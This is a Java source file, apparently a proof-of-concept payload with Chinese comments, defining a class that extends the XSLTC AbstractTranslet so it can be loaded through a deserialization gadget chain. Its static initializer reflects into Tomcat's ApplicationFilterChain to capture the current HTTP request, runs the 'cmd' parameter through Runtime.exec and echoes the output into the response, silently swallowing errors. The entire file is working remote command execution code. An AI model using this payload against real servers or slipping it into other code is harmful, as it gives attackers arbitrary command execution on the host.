package classpoc;

// 编译命令：javac -encoding UTF-8 src/main/java/classpoc/ThreadLocalEchoPro.java

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class ThreadLocalEchoPro extends AbstractTranslet {
    static {
        try {
            // 通过反射获取类，避免编译时依赖
            Class applicationFilterChainCls = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            java.lang.reflect.Field lastServicedRequestField = applicationFilterChainCls.getDeclaredField("lastServicedRequest");
            java.lang.reflect.Field lastServicedResponseField = applicationFilterChainCls.getDeclaredField("lastServicedResponse");

            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            // 初始化 ThreadLocal
            if (lastServicedRequestField.get(null) == null) {
                lastServicedRequestField.set(null, new ThreadLocal());
            }
            if (lastServicedResponseField.get(null) == null) {
                lastServicedResponseField.set(null, new ThreadLocal());
            }

            // 获取 Request 和 Response 对象
            ThreadLocal requestThreadLocal = (ThreadLocal) lastServicedRequestField.get(null);
            ThreadLocal responseThreadLocal = (ThreadLocal) lastServicedResponseField.get(null);

            Object request = requestThreadLocal.get();
            Object response = responseThreadLocal.get();

            if (request != null && response != null) {
                // 通过反射调用 getParameter("cmd")
                String cmd = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, "cmd");
                if (cmd != null && !cmd.isEmpty()) {
                    // 执行命令
                    byte[] bytes = new byte[1024];
                    int len = Runtime.getRuntime().exec(cmd).getInputStream().read(bytes);

                    // 获取 Writer 并回显
                    Object writer = response.getClass().getMethod("getWriter").invoke(response);
                    writer.getClass().getMethod("write", String.class).invoke(writer, new String(bytes, 0, len));
                    writer.getClass().getMethod("flush").invoke(writer);
                }
            }
        } catch (Exception e) {}
    }

    @Override
    public void transform(DOM d, SerializationHandler[] h) throws TransletException {}
    @Override
    public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) throws TransletException {}
}